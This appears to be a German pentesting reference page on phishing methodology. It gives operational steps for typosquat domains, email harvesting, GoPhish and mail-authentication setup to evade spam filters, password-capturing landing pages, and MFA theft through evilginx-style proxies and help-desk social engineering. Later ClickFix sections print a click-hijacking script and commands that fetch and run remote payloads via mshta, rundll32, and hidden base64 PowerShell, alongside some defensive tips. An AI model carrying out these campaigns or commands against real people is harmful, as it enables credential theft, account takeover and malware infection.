# Phishing-Methodik

{{#include ../../banners/hacktricks-training.md}}

## Methodik

1. Opfer auskundschaften
1. Die **Opfer-Domain** auswählen.
2. Eine grundlegende Web-Aufzählung durchführen, **nach Login-Portalen suchen**, die vom Opfer verwendet werden, und **entscheiden**, welches davon du **imitieren** wirst.
3. **OSINT** verwenden, um **E-Mail-Adressen zu finden**.
2. Die Umgebung vorbereiten
1. Die **Domain kaufen**, die du für die Phishing-Bewertung verwenden wirst
2. Die zugehörigen Einträge des **E-Mail-Service konfigurieren** (SPF, DMARC, DKIM, rDNS)
3. Den VPS mit **gophish** konfigurieren
3. Die Kampagne vorbereiten
1. Die **E-Mail-Vorlage vorbereiten**
2. Die **Webseite vorbereiten**, um die Zugangsdaten zu stehlen
4. Die Kampagne starten!

## Ähnliche Domainnamen generieren oder eine vertrauenswürdige Domain kaufen

### Techniken zur Variation von Domainnamen

- **Keyword**: Der Domainname **enthält ein wichtiges **Keyword** der ursprünglichen Domain (z. B. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Den **Punkt durch einen Bindestrich** in einer Subdomain ersetzen (z. B. www-zelster.com).
- **New TLD**: Dieselbe Domain mit einer **neuen TLD** verwenden (z. B. zelster.org)
- **Homoglyph**: Einen Buchstaben im Domainnamen durch **ähnlich aussehende Buchstaben** ersetzen (z. B. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Zwei Buchstaben innerhalb des Domainnamens **vertauschen** (z. B. zelsetr.com).
- **Singularization/Pluralization**: Am Ende des Domainnamens ein „s“ hinzufügen oder entfernen (z. B. zeltsers.com).
- **Omission**: Einen der Buchstaben aus dem Domainnamen **entfernen** (z. B. zelser.com).
- **Repetition:** Einen der Buchstaben im Domainnamen **wiederholen** (z. B. zeltsser.com).
- **Replacement**: Wie Homoglyph, aber weniger unauffällig. Einen der Buchstaben im Domainnamen ersetzen, möglicherweise durch einen Buchstaben in der Nähe des ursprünglichen Buchstabens auf der Tastatur (z. B. zektser.com).
- **Subdomained**: Einen **Punkt** innerhalb des Domainnamens einfügen (z. B. ze.lster.com).
- **Insertion**: Einen Buchstaben in den Domainnamen **einfügen** (z. B. zerltser.com).
- **Missing dot**: Die TLD an den Domainnamen anhängen (z. B. zelstercom.com)

**Automatische Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Es besteht die **Möglichkeit, dass einige der gespeicherten oder übertragenen Bits aufgrund verschiedener Faktoren wie Sonneneruptionen, kosmischer Strahlung oder Hardwarefehlern automatisch umgekehrt werden**.

Wenn dieses Konzept auf **DNS-Anfragen angewendet wird**, ist es möglich, dass die **vom DNS-Server empfangene Domain** nicht mit der ursprünglich angeforderten Domain übereinstimmt.

Beispielsweise kann eine einzelne Bitänderung in der Domain „windows.com“ diese in „windnws.com“ ändern.

Angreifer können sich dies **zunutze machen, indem sie mehrere Bitflipping-Domains registrieren**, die der Domain des Opfers ähneln. Ihr Ziel besteht darin, legitime Benutzer auf ihre eigene Infrastruktur umzuleiten.

Weitere Informationen findest du unter [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Eine vertrauenswürdige Domain kaufen

Du kannst unter [https://www.expireddomains.net/](https://www.expireddomains.net) nach einer abgelaufenen Domain suchen, die du verwenden könntest.\
Um sicherzustellen, dass die abgelaufene Domain, die du kaufen möchtest, **bereits eine gute SEO** aufweist, kannst du prüfen, wie sie kategorisiert ist unter:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## E-Mail-Adressen entdecken

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100 % kostenlos)
- [https://phonebook.cz/](https://phonebook.cz) (100 % kostenlos)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Um **weitere** gültige E-Mail-Adressen zu **entdecken** oder die bereits entdeckten **zu überprüfen**, kannst du prüfen, ob du sie auf den SMTP-Servern des Opfers brute-forcen kannst. [Hier erfährst du, wie du E-Mail-Adressen überprüfen/entdecken kannst](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Vergiss außerdem nicht: Wenn die Benutzer **ein Webportal für den Zugriff auf ihre E-Mails verwenden**, kannst du prüfen, ob es für **Username Brute Force** anfällig ist, und die Schwachstelle, sofern möglich, ausnutzen.

## GoPhish konfigurieren

### Installation

Du kannst es unter [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) herunterladen.

Lade es herunter, entpacke es nach `/opt/gophish` und führe `/opt/gophish/gophish` aus.\
In der Ausgabe wird dir ein Passwort für den Admin-Benutzer auf Port 3333 angezeigt. Greife daher auf diesen Port zu und verwende diese Zugangsdaten, um das Admin-Passwort zu ändern. Möglicherweise musst du diesen Port zu local tunneln:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguration

**Konfiguration des TLS-Zertifikats**

Vor diesem Schritt solltest du die **Domain, die du verwenden wirst, bereits gekauft haben**, und sie muss auf die **IP des VPS** zeigen, auf dem du **gophish** konfigurierst.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail-Konfiguration**

Beginne mit der Installation: `apt-get install postfix`

Füge die Domain anschließend zu den folgenden Dateien hinzu:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Ändere außerdem die Werte der folgenden Variablen in `/etc/postfix/main.cf`:**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Ändere abschließend die Dateien **`/etc/hostname`** und **`/etc/mailname`** zu deinem Domainnamen und **starte deinen VPS neu.**

Erstelle nun einen **DNS-A-Record** für `mail.<domain>`, der auf die **IP-Adresse** des VPS zeigt, sowie einen **DNS-MX-Record**, der auf `mail.<domain>` zeigt.

Teste nun das Senden einer E-Mail:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish-Konfiguration**

Stoppe die Ausführung von Gophish und konfiguriere es.\
Ändere `/opt/gophish/config.json` wie folgt (beachte die Verwendung von https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish service konfigurieren**

Um den gophish service zu erstellen, damit er automatisch gestartet und als Dienst verwaltet werden kann, kannst du die Datei `/etc/init.d/gophish` mit folgendem Inhalt erstellen:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Schließe die Konfiguration des Dienstes ab und überprüfe ihn mit:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Mailserver und Domain konfigurieren

### Warten und seriös wirken

Je älter eine Domain ist, desto unwahrscheinlicher wird sie als Spam erkannt. Daher solltest du vor dem Phishing-Assessment so lange wie möglich warten (mindestens 1 Woche). Wenn du außerdem eine Seite über einen seriösen Bereich einrichtest, wird die erworbene Reputation besser sein.

Beachte, dass du auch dann, wenn du eine Woche warten musst, jetzt alles konfigurieren kannst.

### Reverse-DNS-(rDNS-)Record konfigurieren

Lege einen rDNS-(PTR-)Record fest, der die IP-Adresse des VPS in den Domainnamen auflöst.

### Sender Policy Framework (SPF) Record

Du musst **einen SPF-Record für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein SPF-Record ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Du kannst [https://www.spfwizard.net/](https://www.spfwizard.net) verwenden, um deine SPF-Richtlinie zu generieren (verwende die IP-Adresse des VPS).

![SPF-Wizard-Formular zur Generierung eines SPF-Records für eine Phishing-Domain](<../../images/image (1037).png>)

Dies ist der Inhalt, der in einem TXT-Record innerhalb der Domain festgelegt werden muss:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC)-Eintrag

Du musst einen **DMARC-Eintrag für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein DMARC-Eintrag ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Du musst einen neuen DNS-TXT-Eintrag erstellen, der auf den Hostnamen `_dmarc.<domain>` mit folgendem Inhalt zeigt:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Du musst **einen DKIM für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein DKIM-Record ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Dieses Tutorial basiert auf: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Du musst beide B64-Werte verketten, die der DKIM-Key generiert:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Bewerte deine E-Mail-Konfiguration

Du kannst dafür [https://www.mail-tester.com/](https://www.mail-tester.com) verwenden.\
Öffne einfach die Seite und sende eine E-Mail an die dort angegebene Adresse:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Du kannst auch deine **E-Mail-Konfiguration überprüfen**, indem du eine E-Mail an `check-auth@verifier.port25.com` sendest und **die Antwort liest** (dafür musst du Port **25** **öffnen** und die Antwort in der Datei _/var/mail/root_ ansehen, wenn du die E-Mail als root sendest).\
Überprüfe, dass du alle Tests bestehst:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Du könntest auch eine **Nachricht an ein Gmail-Konto unter deiner Kontrolle senden** und die **Header der E-Mail** in deinem Gmail-Posteingang überprüfen. `dkim=pass` sollte im Header-Feld `Authentication-Results` vorhanden sein.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Aus der Spamhaus-Blacklist entfernen

Die Seite [www.mail-tester.com](https://www.mail-tester.com) kann dir anzeigen, ob deine Domain von Spamhaus blockiert wird. Du kannst beantragen, dass deine Domain/IP unter [https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/) entfernt wird.

### Aus der Microsoft-Blacklist entfernen

​​Du kannst beantragen, dass deine Domain/IP unter [https://sender.office.com/](https://sender.office.com) entfernt wird.

## GoPhish-Kampagne erstellen und starten

### Sending Profile

- Lege einen **Namen zur Identifizierung** des Senderprofils fest
- Entscheide, von welchem Konto aus du die Phishing-E-Mails senden möchtest. Vorschläge: _noreply, support, servicedesk, salesforce..._
- Du kannst Benutzername und Passwort leer lassen, musst aber sicherstellen, dass **Ignore Certificate Errors** aktiviert ist

![GoPhish-Kampagne erstellen und starten - Sending Profile: Du kannst Benutzername und Passwort leer lassen, musst aber sicherstellen, dass Ignore Certificate Errors aktiviert ist](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Es wird empfohlen, die Funktion **Send Test Email** zu verwenden, um zu testen, ob alles funktioniert.\
> Ich würde empfehlen, die Test-E-Mails an 10min-Mailadressen zu senden, um zu vermeiden, dass du beim Testen auf eine Blacklist gesetzt wirst.

### Email Template

- Lege einen **Namen zur Identifizierung** des Templates fest
- Schreibe anschließend einen **Betreff** (nichts Ungewöhnliches, sondern etwas, das du in einer normalen E-Mail erwarten würdest)
- Stelle sicher, dass **Add Tracking Image** aktiviert ist
- Schreibe das **E-Mail-Template** (du kannst Variablen wie im folgenden Beispiel verwenden):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Beachte, dass **zur Erhöhung der Glaubwürdigkeit der E-Mail** empfohlen wird, eine Signatur aus einer E-Mail des Kunden zu verwenden. Vorschläge:

- Sende eine E-Mail an eine **nicht existente Adresse** und prüfe, ob die Antwort eine Signatur enthält.
- Suche nach **öffentlichen E-Mail-Adressen** wie info@ex.com, press@ex.com oder public@ex.com, sende ihnen eine E-Mail und warte auf die Antwort.
- Versuche, eine **entdeckte gültige** E-Mail-Adresse zu kontaktieren, und warte auf die Antwort.

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Das Email Template ermöglicht auch das **Anhängen von Dateien zum Versand**. Wenn du außerdem NTLM-Challenges mithilfe speziell präparierter Dateien/Dokumente stehlen möchtest, [lies diese Seite](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Gib einen **Namen** ein.
- **Schreibe den HTML-Code** der Webseite. Beachte, dass du Webseiten **importieren** kannst.
- Aktiviere **Capture Submitted Data** und **Capture Passwords**.
- Lege eine **Weiterleitung** fest.

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Normalerweise musst du den HTML-Code der Seite ändern und lokal einige Tests durchführen (eventuell mithilfe eines Apache-Servers), **bis dir die Ergebnisse gefallen.** Schreibe diesen HTML-Code anschließend in das Feld.\
> Beachte, dass du, wenn du **statische Ressourcen** für das HTML verwenden musst (beispielsweise CSS- und JS-Seiten), diese unter _**/opt/gophish/static/endpoint**_ speichern und anschließend über _**/static/\<filename>**_ darauf zugreifen kannst.

> [!TIP]
> Für die Weiterleitung könntest du **die Benutzer auf die legitime Hauptwebseite** des Opfers weiterleiten oder sie beispielsweise zu _/static/migration.html_ weiterleiten, dort für 5 Sekunden ein **Drehrad (**[**https://loading.io/**](https://loading.io)**) anzeigen und anschließend angeben, dass der Vorgang erfolgreich war**.

### Users & Groups

- Lege einen Namen fest.
- **Importiere die Daten** (beachte, dass du für die Verwendung des Templates in diesem Beispiel den Vornamen, Nachnamen und die E-Mail-Adresse jedes Benutzers benötigst).

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Erstelle schließlich eine Campaign, indem du einen Namen, das Email Template, die Landing Page, die URL, das Sending Profile und die Gruppe auswählst. Beachte, dass die URL der an die Opfer gesendete Link ist.

Beachte, dass das **Sending Profile das Versenden einer Test-E-Mail ermöglicht, um zu sehen, wie die endgültige Phishing-E-Mail aussieht**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

Sobald alles bereit ist, starte einfach die Campaign!

## Website Cloning

Wenn du die Webseite aus irgendeinem Grund klonen möchtest, sieh dir die folgende Seite an:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Bei einigen Phishing-Assessments (hauptsächlich für Red Teams) möchtest du möglicherweise auch **Dateien versenden, die irgendeine Art von Backdoor enthalten** (beispielsweise ein C2 oder einfach etwas, das eine Authentifizierung auslöst).\
Auf der folgenden Seite findest du einige Beispiele:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Der vorherige Angriff ist ziemlich clever, da du eine echte Webseite fälschst und die vom Benutzer eingegebenen Informationen sammelst. Wenn der Benutzer jedoch nicht das korrekte Passwort eingegeben hat oder die von dir gefälschte Anwendung mit 2FA konfiguriert ist, **ermöglichen dir diese Informationen nicht, den getäuschten Benutzer zu impersonifizieren**.

Hier sind Tools wie [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) und [**muraena**](https://github.com/muraenateam/muraena) nützlich. Dieses Tool ermöglicht dir, einen MitM-ähnlichen Angriff durchzuführen. Grundsätzlich funktionieren die Angriffe folgendermaßen:

1. Du **imitierst das Login-Formular** der echten Webseite.
2. Der Benutzer **sendet** seine **Credentials** an deine gefälschte Seite, und das Tool sendet diese an die echte Webseite weiter, **wobei geprüft wird, ob die Credentials funktionieren**.
3. Wenn das Konto mit **2FA** konfiguriert ist, fragt die MitM-Seite danach. Sobald der **Benutzer sie eingibt**, sendet das Tool sie an die echte Webseite weiter.
4. Sobald der Benutzer authentifiziert ist, hast du als Angreifer **die Credentials, die 2FA, das Cookie und alle Informationen** aus jeder Interaktion erfasst, während das Tool einen MitM durchführt.

### Via VNC

Was wäre, wenn du das Opfer statt auf eine **bösartige Seite** mit demselben Aussehen wie das Original auf eine **VNC-Sitzung mit einem Browser leitest, der mit der echten Webseite verbunden ist**? Du könntest sehen, was es tut, das Passwort, die verwendete MFA, die Cookies usw. stehlen.\
Dies ist mit [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) möglich.<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Eine der besten Möglichkeiten festzustellen, ob du entdeckt wurdest, ist natürlich, **deine Domain in Blacklists zu suchen**. Wenn sie dort auftaucht, wurde deine Domain offenbar als verdächtig erkannt.\
Eine einfache Möglichkeit zu prüfen, ob deine Domain in einer Blacklist auftaucht, ist die Verwendung von [https://malwareworld.com/](https://malwareworld.com).

Es gibt jedoch weitere Möglichkeiten festzustellen, ob das Opfer **aktiv nach verdächtigen Phishing-Aktivitäten im Internet sucht**, wie in folgendem Abschnitt erklärt:


{{#ref}}
detecting-phising.md
{{#endref}}

Du kannst **eine Domain mit einem sehr ähnlichen Namen** wie die Domain des Opfers **kaufen und/oder ein Zertifikat** für eine von dir kontrollierte **Subdomain** einer Domain **erstellen**, die das **Keyword** der Domain des Opfers enthält. Wenn das **Opfer** irgendeine **DNS- oder HTTP-Interaktion** mit ihnen durchführt, weißt du, dass es **aktiv nach verdächtigen Domains sucht**, und du musst sehr unauffällig vorgehen.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Verwende [**Phishious** ](https://github.com/Rices/Phishious), um zu prüfen, ob deine E-Mail im Spam-Ordner landet, blockiert wird oder erfolgreich ist.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne Intrusion-Sets überspringen E-Mail-Köder zunehmend vollständig und **zielen direkt auf den Service-Desk-/Identity-Recovery-Workflow**, um MFA zu umgehen. Der Angriff erfolgt vollständig nach dem Prinzip "living-off-the-land": Sobald der Operator gültige Credentials besitzt, bewegt er sich mithilfe integrierter Admin-Tools weiter – Malware ist nicht erforderlich.<sup>[[6]](#references)</sup>

### Attack flow
1. Führe eine Aufklärung des Opfers durch.
* Sammle persönliche und unternehmensbezogene Daten aus LinkedIn, Data Breaches, öffentlichem GitHub usw.
* Identifiziere besonders wertvolle Identitäten (Führungskräfte, IT, Finanzen) und ermittle den **genauen Help-Desk-Prozess** für das Zurücksetzen von Passwort/MFA.
2. Social Engineering in Echtzeit
* Rufe den Help-Desk an, kontaktiere ihn über Teams oder chatte mit ihm, während du dich als Zielperson ausgibst (oft mit **gefälschter Anrufer-ID** oder **klonierter Stimme**).
* Liefere die zuvor gesammelten PII, um die wissensbasierte Verifizierung zu bestehen.
* Überzeuge den Mitarbeiter, das **MFA-Secret zurückzusetzen** oder einen **SIM-Swap** für eine registrierte Mobilnummer durchzuführen.
3. Unmittelbare Aktionen nach dem Zugriff (in realen Fällen ≤60 Min.)
* Sichere dir über ein beliebiges Web-SSO-Portal einen Foothold.
* Ermittle AD/AzureAD mit integrierten Tools (keine Binaries werden abgelegt):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Führe laterale Bewegungen mit **WMI**, **PsExec** oder legitimen **RMM**-Agents durch, die in der Umgebung bereits auf der Allowlist stehen.

### Detection & Mitigation
* Behandle die Identitätswiederherstellung über den Help-Desk als **privilegierten Vorgang** – verlange eine Step-up-Authentifizierung und die Genehmigung eines Vorgesetzten.
* Setze **Identity Threat Detection & Response (ITDR)**-/**UEBA**-Regeln ein, die Folgendes melden:
* MFA-Methode geändert + Authentifizierung von einem neuen Gerät/neuer Region.
* Unmittelbare Rechteerhöhung desselben Principals (User → Admin).
* Zeichne Help-Desk-Anrufe auf und erzwinge vor jedem Reset einen **Rückruf an eine bereits registrierte Nummer**.
* Implementiere **Just-In-Time (JIT) / Privileged Access**, damit neu zurückgesetzte Konten nicht automatisch Tokens mit hohen Rechten erben.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity-Crews gleichen die Kosten von High-Touch-Operationen durch Massenangriffe aus, die **Suchmaschinen und Werbenetzwerke zum Auslieferungskanal machen**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** platziert ein gefälschtes Ergebnis wie `chromium-update[.]site` an erster Stelle der Suchanzeigen.
2. Das Opfer lädt einen kleinen **First-Stage-Loader** herunter (häufig JS/HTA/ISO). Bei Unit 42 beobachtete Beispiele:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Der Loader exfiltriert Browser-Cookies und Credential-Datenbanken und lädt anschließend einen **Silent Loader** nach, der in Echtzeit entscheidet, ob Folgendes eingesetzt wird:
* RAT (z. B. AsyncRAT, RustDesk)
* Ransomware / Wiper
* Persistence-Komponente (Registry-Run-Key + Scheduled Task)

### Hardening tips
* Blockiere neu registrierte Domains und erzwinge **Advanced DNS / URL Filtering** sowohl für *Search Ads* als auch für E-Mail.
* Beschränke Softwareinstallationen auf signierte MSI-/Store-Pakete und verbiete die Ausführung von `HTA`, `ISO` und `VBS` per Policy.
* Überwache untergeordnete Prozesse von Browsern, die Installer öffnen:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Suche nach LOLBins, die häufig von First-Stage-Loadern missbraucht werden (z. B. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Einige gefälschte Software-Portale lassen das sichtbare Download-`href` auf die **echte GitHub-/Release-URL** zeigen, hijacken jedoch die **erste** Benutzerinteraktion per JavaScript und leiten das Opfer stattdessen in eine Kette aus **Traffic Distribution System (TDS)** weiter.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Wichtige Merkmale:
- Der Hook läuft gewöhnlich in der **Capture-Phase** (`true`) auf `document`, sodass er vor den Site-Handlern ausgelöst wird.
- Chrome verwendet häufig `mousedown` statt `click`, um die Weiterleitung an eine gültige **User-Geste** zu binden und die Umgehung von Popup-Blockern zu verbessern.
- Einige Varianten öffnen vorab `about:blank` oder simulieren Klicks auf `<a target="_blank">` und weisen die TDS-URL erst später zu.
- Browserseitige Limits liegen häufig in `localStorage`, sodass der **erste Klick** möglicherweise Malware erreicht, während Aktualisierungen/Wiederholungen auf den harmlos aussehenden sichtbaren Link zurückfallen.
- Die TDS kann nach Referrer, Einstiegsdomain, GEO, Browser-/Geräte-Fingerprint, VPN-/Datacenter-Prüfungen, Klickkontext und sitzungsbezogenen Zählern filtern, wodurch Wiederholungen durch Analysten nicht deterministisch sind.

Ideen für Defender:
- Vergleiche das **angezeigte** `href` mit dem **tatsächlichen** Navigationsziel, das zum Zeitpunkt des Klicks erzeugt wird.
- Suche nach `document.addEventListener(..., true)`-Handlern, die rund um `window.open`, `about:blank` oder simulierte Anchor-Klicks sowohl `preventDefault()` als auch `stopImmediatePropagation()` aufrufen.
- Behandle Gruppen neu registrierter Software-Download-Domains, die alle dieselbe CloudFront/JS-Stage laden, als starkes Signal für ein SEO-Poisoning-/TDS-Muster.

### ClickFix über gefälschte Verifizierungsseiten + archive-ähnliche LOLBAS-Fetches
Einige TDS-Zweige enden auf einer gefälschten Verifizierungsseite (im Stil von Cloudflare/IUAM), die das Opfer auffordert, eine vertrauenswürdige Windows-Binärdatei auszuführen, etwa:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Hinweise:
- `mshta.exe` führt das **HTA/VBScript am Anfang der Response** aus, selbst wenn die URL vorgibt, ein `.7z`-Archiv zu sein; angehängte Archivdaten können reine Täuschung sein.
- Nachfolgende Stufen täuschen häufig weiterhin einen falschen Dateityp vor (`.rtf` für PowerShell, `.asar` für Python, ZIPs mit aufgefüllten Binaries) und wechseln dann zu **manuellem PE-Mapping / In-Memory-Ausführung**.
- Wenn Sie auf eine dieser Ketten reagieren, bewahren Sie **Netzwerk + Speicher ab dem ersten erfolgreichen Lauf**: Spätere Wiederholungen zeigen möglicherweise nur einen harmlosen Installer-/SFX-Pfad oder schlagen fehl, weil die Payload-/Schlüssel-Freigabe an die ursprüngliche TDS-Sitzung gebunden war.

### ClickFix-DLL-Zustellung (gefälschtes CERT-Update)
* Köder: geklonte nationale CERT-Warnung mit einer **Update**-Schaltfläche, die Schritt-für-Schritt-Anweisungen zur „Behebung“ anzeigt. Die Opfer werden angewiesen, eine Batch-Datei auszuführen, die eine DLL herunterlädt und sie über `rundll32` ausführt.<sup>[[12]](#references)</sup>
* Typische beobachtete Batch-Kette:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` legt die Payload unter `%TEMP%` ab, eine kurze Wartezeit verbirgt Netzwerk-Jitter, anschließend ruft `rundll32` den exportierten Einstiegspunkt (`notepad`) auf.
* Die DLL sendet die Host-Identität an den C2 und fragt alle paar Minuten den C2 ab. Remote-Tasking trifft als **base64-codiertes PowerShell** ein, das versteckt und mit Richtlinienumgehung ausgeführt wird:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
